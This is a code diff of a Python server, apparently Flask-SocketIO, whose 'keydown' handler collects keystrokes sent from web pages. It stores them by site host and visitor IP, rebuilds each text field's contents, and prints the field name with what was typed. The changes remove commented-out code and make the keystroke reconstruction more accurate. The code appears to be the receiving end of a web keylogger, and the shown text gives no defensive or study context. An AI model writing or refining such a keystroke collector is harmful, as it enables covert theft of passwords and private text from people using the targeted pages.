@@ -52,33 +52,12 @@ def keydown(message):
     ip = request.remote_addr
 
     host = message['page_details']['url']['host']
-    '''
-    if host not in hosts:
-        hosts[host] = {}
-    '''
     
     clients = hosts[host]
     client = clients[ip]
 
-    '''
-    client = message['page_details']['ipaddr']
-    if client not in clients:
-        clients[client] = {}
-    '''
-
     text_field = message['data']['tag_details']
     _id = text_field['_id']
-    '''
-    text_field = message['data']['tag_details']
-    _id = text_field['_id']
-    if _id not in clients:
-
-        clients[_id] = {
-            '_id' : text_field['_id'],
-            'info' :  text_field,
-            'contents' : [],
-        }
-    '''
     contents = client[_id]['contents']
         
     keystroke = message['data']['ks']
@@ -98,14 +77,14 @@ def keydown(message):
         if selection_start == selection_end and selection_start != 0:
             contents.pop(selection_start-1)
         else:
-            contents = contents[:selection_start] + contents[selection_end:]
+            del contents[selection_start:selection_end]
 
     elif keystroke == 'DELETE':
 
         if selection_start == selection_end and selection_end != len(contents):
             contents.pop(selection_start)
         else:
-            contents = contents[:selection_start] + contents[selection_end:]
+            del contents[selection_start:selection_end]
     else:
         
         if shift_pressed:
@@ -114,14 +93,14 @@ def keydown(message):
                 keystroke = tables.shift[keystroke]
             elif keystroke.isalpha():
                 keystroke = keystroke.upper()
-        contents.append(keystroke)
 
+        if selection_start != selection_end:
+            del contents[selection_start:selection_end]
+
+        contents.insert(selection_start, keystroke)
 
     print message['data']['tag_details']['name'], '-->',
     print ''.join(contents)
-
-    #pprint(data)
-    #pprint(message)
 
 if __name__ == '__main__':
     socketio.run(app)
